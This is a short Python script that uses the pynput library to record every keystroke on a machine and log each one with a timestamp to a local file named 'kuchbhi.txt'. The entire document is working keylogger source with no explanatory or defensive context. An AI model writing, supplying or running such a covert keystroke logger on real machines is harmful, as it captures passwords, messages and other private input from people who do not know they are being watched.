from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("kuchbhi.txt"),level=logging.DEBUG,format="%(asctime)s_%(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press)as listener:
    listener.join()
